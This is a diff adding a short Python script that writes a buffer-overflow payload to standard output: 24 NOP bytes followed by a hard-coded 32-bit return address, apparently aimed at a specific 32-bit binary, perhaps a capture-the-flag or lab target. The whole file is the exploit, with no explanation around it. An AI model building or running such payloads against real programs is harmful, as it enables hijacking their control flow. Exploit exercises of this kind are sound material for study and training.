@@ -1,0 +1,8 @@
+#!/usr/bin/env python3
+import sys
+
+payload  = b"\x90" * 24
+payload += b"\xa6\x91\x04\x08"
+
+sys.stdout.buffer.write(payload)
+
